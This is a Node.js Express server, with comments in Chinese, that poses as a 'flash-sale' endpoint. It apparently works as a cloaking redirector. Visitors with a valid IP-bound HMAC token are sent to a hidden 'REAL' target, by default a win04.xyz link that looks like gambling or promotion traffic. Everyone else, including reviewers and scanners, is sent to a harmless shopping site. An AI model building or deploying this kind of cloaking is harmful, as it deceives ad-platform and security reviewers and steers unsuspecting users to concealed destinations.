import express from 'express';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 3002;

const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
const REAL_TARGET = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
const FAKE_TARGET = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';

// ============================================
// 严格的 HMAC token 验证
// token格式: ts.ip_sig.hex_sig
// ============================================
function verifyHMAC(token, clientIP) {
  if (!token || typeof token !== 'string') return false;

  // 假token直接拒绝
  if (token.startsWith('fake_')) return false;

  const parts = token.split('.');
  if (parts.length !== 3) return false;

  const [ts, ipSig, hexSig] = parts;
  const timestamp = parseInt(ts);

  // 1. 时间戳合理性检查（5分钟窗口）
  const age = Date.now() - timestamp;
  if (isNaN(timestamp) || age < 0 || age > 5 * 60 * 1000) {
    console.log(`[flash-sale] Token expired or invalid: age=${age}ms`);
    return false;
  }

  // 2. IP签名验证
  const expectedIpSig = crypto.createHmac('sha256', HMAC_SECRET).update(clientIP).digest('hex').substring(0, 32);
  if (ipSig !== expectedIpSig) {
    console.log(`[flash-sale] IP sig mismatch`);
    return false;
  }

  // 3. 完整签名验证
  const sigData = `${ts}.${clientIP}`;
  const expectedHexSig = crypto.createHmac('sha256', HMAC_SECRET).update(sigData).digest('hex');
  if (hexSig !== expectedHexSig) {
    console.log(`[flash-sale] HMAC sig mismatch`);
    return false;
  }

  return true;
}

function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['cf-connecting-ip'] ||
         req.socket?.remoteAddress?.replace('::ffff:', '') ||
         'unknown';
}

// ============================================
// GET /flash-sale
// ============================================
app.get('/flash-sale', (req, res) => {
  const { token } = req.query;
  const clientIP = getClientIP(req);

  console.log(`[flash-sale] token=${token ? token.substring(0, 12) + '...' : 'none'} ip=${clientIP}`);

  if (!token) {
    console.log('[flash-sale] No token → FAKE');
    return res.redirect(FAKE_TARGET);
  }

  if (verifyHMAC(token, clientIP)) {
    console.log('[flash-sale] REAL TOKEN → REAL PAGE');
    return res.redirect(REAL_TARGET);
  } else {
    console.log('[flash-sale] FAKE/INVALID TOKEN → FAKE PAGE');
    return res.redirect(FAKE_TARGET);
  }
});

// ============================================
// GET /flash-sale/check (用于调试)
// ============================================
app.get('/flash-sale/check', (req, res) => {
  const { token } = req.query;
  const clientIP = getClientIP(req);

  if (!token) {
    return res.json({ valid: false, reason: 'no_token' });
  }

  const valid = verifyHMAC(token, clientIP);
  return res.json({
    valid,
    reason: valid ? 'valid_token' : 'invalid_or_expired_token',
    token_prefix: token.substring(0, 8)
  });
});

// ============================================
// 健康检查
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[flash-sale] Running on port ${PORT}`);
  console.log(`[flash-sale] REAL → ${REAL_TARGET}`);
  console.log(`[flash-sale] FAKE → ${FAKE_TARGET}`);
});
